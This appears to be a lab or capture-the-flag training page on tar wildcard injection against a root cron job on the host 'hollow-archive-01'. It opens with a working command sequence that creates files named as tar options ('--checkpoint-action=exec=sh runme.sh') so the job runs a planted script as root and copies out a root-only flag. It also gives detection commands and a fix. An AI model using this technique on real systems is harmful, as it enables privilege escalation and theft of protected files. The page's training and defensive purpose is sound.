# C06 · Station A — tar --checkpoint-action · ★★☆☆

> **Chapter:** [[Chapter-06-Overview]] · **Next:** [[C06-Station-B-rsync-e]]
> **Host:** `hollow-archive-01` (`target-wild`) · **Job:** `tar czf /opt/out/archive.tgz *` in `/opt/archive`
> **The bug:** a filename becomes a `tar` option.

---

## 1. Exploit — do this first

```bash
cd /opt/archive
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > runme.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh runme.sh"
# wait <=60s for the cron tick:
cat /tmp/flag
```

| Token | What it does |
|---|---|
| `--checkpoint=1` | fire an action at checkpoint 1 (almost immediately) |
| `--checkpoint-action=exec=sh runme.sh` | run `sh runme.sh` as root at that checkpoint |
| `touch --` | stops `touch` eating the leading dashes |

---

## 2. How you find it

```bash
cat /usr/local/sbin/archive-run.sh   # tar czf ... *  in a 0777 dir
ls -ld /opt/archive                  # drwxrwxrwx — you can write it
```

## 3. Why it works

After the shell expands `*`, tar sees `--checkpoint=1` and
`--checkpoint-action=exec=sh runme.sh` as **options**, reaches checkpoint 1, and
runs your command as root.

## 4. Pitfalls

- Create all three files: `runme.sh`, `--checkpoint=1`, and the action file.
- A shell the job spawns dies with it — have the payload copy the flag out.

## 5. Detect & fix

- **Detect:** `find / -name '--*' 2>/dev/null`; `grep -RnE 'tar .*\*' /etc/cron*`.
- **Fix:** `tar czf out.tgz ./*` or `-C dir .`; never a bare `*`. [[Blue-Team-Playbook]].

## 6. What you learned

- The canonical wildcard RCE, and GTFOBins' tar "checkpoint" trick.

> Next: [[C06-Station-B-rsync-e]] · Related: [[C02-Station-E-Tar-Wildcard-Injection]]
